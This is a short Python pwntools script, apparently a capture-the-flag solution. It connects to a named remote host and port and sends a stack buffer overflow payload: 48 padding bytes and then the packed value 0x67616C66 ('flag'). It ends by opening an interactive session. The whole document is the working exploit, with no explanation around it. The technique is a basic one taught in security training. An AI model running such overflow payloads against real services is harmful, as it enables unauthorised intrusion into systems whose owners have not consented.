from pwn import *

host, port = "thekidofarcrania.com", 35235

conn = remote(host, port)

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

payload += p32(0x67616C66)

conn.sendline(payload)

conn.interactive()
